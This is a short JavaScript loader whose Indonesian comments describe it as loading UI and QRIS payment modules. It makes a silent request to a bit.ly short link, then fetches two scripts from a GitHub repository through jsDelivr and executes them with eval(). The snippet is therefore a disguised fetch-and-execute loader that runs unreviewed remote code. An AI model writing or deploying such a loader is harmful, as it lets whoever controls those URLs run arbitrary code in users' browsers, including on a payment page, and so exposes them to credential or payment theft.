
(async function() {
  try {
    // JS QR (PRIVATE)
    fetch("https://bit.ly/integrate-api-fuzz.js").catch(()=>{});

    // JS CSS (UMUM)
    const ui = await fetch("https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/readme/2.js").then(r => r.text());
    eval(ui);

    // JS BUTTON (UMUM)
    const qris = await fetch("https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/readme/3.js").then(r => r.text());
    eval(qris);

    console.log("✅ Modul UI & QRIS berhasil dimuat");
  } catch (e) {
    console.error("❌ Gagal memuat modul:", e);
  }
})();
